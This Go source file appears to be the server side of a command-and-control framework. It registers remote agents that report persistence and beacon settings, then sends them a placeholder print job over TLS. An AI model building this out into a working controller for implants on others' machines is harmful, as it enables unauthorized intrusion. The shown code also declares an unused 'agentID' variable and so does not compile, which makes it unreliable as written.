package server

import (
	"crypto/tls"
	"encoding/json"
	"log"

	"github.com/joe-broder15/supertrooper/internal/messages"
)

func processHelloMessage(message messages.C2MessageBase, tlsConn *tls.Conn, agentManager *AgentManager) {

	helloPayload, err := messages.ParseHelloPayload(message.C2MessagePayload)
	if err != nil {
		log.Printf("server: error parsing hello payload: %v", err)
		return
	}

	// if the agent id is none, this is a brand new agent that has not been registered with a C2 server. we will then register it
	if message.AgentID == "none" {
		agentID := agentManager.RegisterAgent(tlsConn.RemoteAddr().String(), helloPayload.IsPersistent, helloPayload.BeaconSeconds, helloPayload.MissesBeforeDeath)
	} else {
		// if the agent id is not none, this is an existing agent that is reconnecting to the server. we will then update the agent's info
		agentManager.UpdateAgent(message.AgentID, tlsConn.RemoteAddr().String(), helloPayload.IsPersistent, helloPayload.BeaconSeconds, helloPayload.MissesBeforeDeath)
	}

}

func processAgentMessage(event ServerEventAgentC2Message, agentManager *AgentManager) {
	// get the message and the agent connection
	message := event.Message
	tlsConn := event.AgentConn

	// pretty print the message
	log.Printf("server: received message type: %v from agent with id: %v and ip: %v", message.Type, message.AgentID, tlsConn.RemoteAddr())

	switch message.Type {
	case messages.C2MessageTypeHello:
		processHelloMessage(message, tlsConn, agentManager)
	}

	// if the job was a hello, send a response to the agent
	if message.Type == messages.C2MessageTypeHello {
		printPayload := messages.BuildJobPayloadPrint("hello")
		response := messages.BuildJobDispatchMessage("server", "123", messages.JobTypePrint, printPayload)
		encoder := json.NewEncoder(tlsConn)
		encoder.Encode(response)
	}
}

func processError(event ServerEventError) {
	log.Printf("server: error: %v", event.Error)
}

func processEvent(event ServerEvent, agentManager *AgentManager) {
	switch event.Type {
	case ServerEventTypeAgentC2Message:
		processAgentMessage(event.Body.(ServerEventAgentC2Message), agentManager)
	case ServerEventTypeError:
		processError(event.Body.(ServerEventError))
	}
}
